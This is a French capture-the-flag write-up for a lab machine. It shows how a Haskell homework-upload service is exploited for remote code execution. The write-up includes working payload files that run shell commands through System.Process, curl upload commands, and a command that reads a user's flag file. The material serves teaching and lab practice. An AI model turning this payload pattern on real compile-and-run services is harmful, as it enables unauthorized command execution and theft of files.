# Write-up : "Fun With Functional"

**Cible :** 10.10.0.10

**Difficulté :** Easy

**Techniques utilisées :** Reconnaissance réseau, énumération web, upload de fichier malveillant, exécution de code arbitraire (RCE), énumération post-exploitation, escalade de privilèges

**Outils utilisés :** nmap, curl

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sC -sV -p- -T4 10.10.0.10
```

**Ce que fait cette commande :** `nmap` est un scanner de ports. Il envoie des paquets réseau à la machine cible pour découvrir quels services (ports) sont ouverts et accessibles.

- `-sC` : lance des scripts de détection automatique (bannières, vulnérabilités connues, versions de service).
- `-sV` : essaie de déterminer précisément la version de chaque service détecté.
- `-p-` : scanne l'intégralité des 65535 ports possibles (pas seulement les plus courants).
- `-T4` : règle la vitesse du scan sur "agressif" pour aller plus vite.

**Résultat :**

- `22/tcp` : SSH (OpenSSH 10.0p2) — service d'accès distant sécurisé, ici juste identifié, pas exploité directement dans un premier temps.
- `5001/tcp` : Un serveur web tournant sous Flask (framework Python) via Werkzeug. La page d'accueil, intitulée "FUN with functionnal!", se moque de la sécurité et vante les mérites du langage Haskell, avec un lien vers une page `/homework`.

---

## 2. Découverte du formulaire d'upload

**Commande :**

```bash
curl -s http://10.10.0.10:5001/homework
```

**Ce que fait cette commande :** `curl` envoie une requête HTTP GET à cette URL et affiche la réponse du serveur (le code HTML de la page), exactement comme le ferait un navigateur, mais en ligne de commande.

**Résultat :** La page affiche un formulaire d'upload de fichier. Le texte explique qu'il faut envoyer un programme Haskell (extension `.hs`) qui affiche le message "I love Haskell", et que ce fichier sera automatiquement compilé et corrigé par un "outil d'autocorrection" côté serveur.

**Pourquoi c'est intéressant :** dès qu'un serveur web accepte de compiler et d'exécuter un fichier envoyé par un utilisateur externe, cela ouvre la porte à une exécution de code arbitraire — le contenu du programme n'est jamais vérifié ni limité par le serveur.

---

## 3. Exploitation : Exécution de code arbitraire (RCE) via upload Haskell

**Faille exploitée :** Upload et exécution de code non sandboxé (CWE-434 : Unrestricted Upload of File with Dangerous Type).

**Explication de la faille :** Le serveur récupère le fichier `.hs` envoyé, le compile avec GHC (le compilateur Haskell) puis exécute le binaire obtenu, sans jamais vérifier ce que fait réellement ce programme. Le langage Haskell dispose d'un module appelé `System.Process` qui permet d'exécuter n'importe quelle commande du système d'exploitation (comme le ferait un script bash). En écrivant nous-mêmes le programme Haskell, on peut donc lui faire exécuter les commandes de notre choix sur le serveur, à la place du serveur lui-même.

### Création du payload (fichier Haskell piégé)

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "id" [] ""
    putStrLn output
EOF
```

**Ce que fait cette commande :** `cat > exploit.hs << 'EOF' ... EOF` est une manière d'écrire plusieurs lignes de texte directement dans un nouveau fichier nommé `exploit.hs`, sans avoir besoin d'ouvrir un éditeur de texte. Tout ce qui se trouve entre les deux `EOF` devient le contenu du fichier.

**Explication du code Haskell contenu dans le fichier :**

- `import System.Process` : charge le module Haskell qui permet de lancer des commandes système.
- `putStrLn "I love Haskell"` : affiche le texte demandé par le challenge (pour respecter la consigne affichée sur le site).
- `output <- readProcess "id" [] ""` : exécute la commande système `id` (qui affiche l'identité de l'utilisateur courant : uid, gid, groupes) et récupère sa sortie dans la variable `output`.
- `putStrLn output` : affiche cette sortie récupérée.

### Upload du fichier vers le serveur

```bash
curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
```

**Ce que fait cette commande :** envoie une requête HTTP POST (méthode utilisée pour soumettre des formulaires) contenant le fichier `exploit.hs` en pièce jointe, exactement comme si on cliquait sur "Parcourir" puis "Upload" dans un vrai formulaire web.

- `-X POST` : précise la méthode HTTP à utiliser.
- `-F "file=@exploit.hs"` : indique à curl d'envoyer le fichier local `exploit.hs` comme donnée de formulaire, sous le nom de champ `file` (celui attendu par le formulaire HTML du site).

Le serveur répond par une redirection vers `/uploads/exploit.hs`, signe que l'upload a été accepté.

### Récupération du résultat de la compilation/exécution

```bash
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**Ce que fait cette commande :** récupère la page où le serveur affiche le résultat de la compilation et de l'exécution du fichier qu'on vient d'envoyer.

**Résultat obtenu :**

```
[1 of 2] Compiling Main ...
[2 of 2] Linking ...
I love Haskell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le serveur a bien compilé notre programme, l'a exécuté, et on récupère la sortie de la commande `id` : le serveur tourne avec l'utilisateur système `www-data` (l'utilisateur habituel des serveurs web Apache/Nginx). **L'exécution de commande arbitraire est confirmée.**

---

## 4. Localisation du flag user.txt

Maintenant qu'on peut exécuter n'importe quelle commande, on cherche l'emplacement du fichier `user.txt` sur le système de fichiers.

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "bash" ["-c", "find / -name user.txt 2>&1"] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**Explication du changement dans le code :** au lieu d'exécuter directement la commande `id`, on demande maintenant d'exécuter `bash -c "..."`, ce qui permet de lancer n'importe quelle commande shell complète, avec ses propres options.

- `find / -name user.txt` : cherche, à partir de la racine du système (`/`), tout fichier nommé exactement `user.txt`.
- `2>&1` : redirige les messages d'erreur (comme "permission refusée" sur les dossiers protégés) vers la même sortie que le résultat normal, pour tout voir d'un coup plutôt que de les perdre.

**Résultat :** parmi une longue liste de messages "Permission denied" (normal, `www-data` n'a pas accès à tous les dossiers du système), on trouve la ligne recherchée :

```
/home/prof/user.txt
```

Le fichier appartient donc à un utilisateur nommé `prof`.

---

## 5. Lecture du flag user

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "cat" ["/home/prof/user.txt"] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**Explication :** ici, on exécute directement la commande `cat` (affichage du contenu d'un fichier) avec comme argument le chemin exact trouvé à l'étape précédente.

**Résultat obtenu :**

```
EPI{TODO_remplacer_par_le_flag_reellement_obtenu}
```

---

## Résumé de faille exploitée

| #   | Faille                                                         | Type / Catégorie                    | Explication courte                                                                                                                                                              |
| --- | -------------------------------------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Upload et exécution de code Haskell arbitraire sans sandboxing | Unrestricted Upload / RCE (CWE-434) | Le serveur compile et exécute aveuglément tout fichier `.hs` envoyé, permettant d'exécuter n'importe quelle commande système via le module `System.Process` du langage Haskell. |

---

## Points techniques notables

**Réutilisation du nom de fichier :** lors des tests, uploader un fichier avec un nom jamais utilisé auparavant provoquait parfois une erreur de compilation passagère côté serveur (probablement liée à un souci de verrou ou de cache du compilateur GHC lorsqu'il gère plusieurs fichiers en même temps). En revanche, réutiliser le nom d'un fichier qui avait déjà compilé avec succès (`exploit.hs`), tout en changeant simplement son contenu à chaque fois, fonctionnait de manière fiable.

Les messages `[Source file changed]` et `[Objects changed]` affichés par le compilateur confirmaient bien qu'il recompilait à chaque fois le nouveau contenu du fichier, malgré la réutilisation du même nom.

---

## Conclusion

- **Accès initial :** RCE via upload de fichier Haskell non sandboxé → shell en tant que `www-data`.
- **Flag user :** obtenu dans `/home/prof/user.txt`.
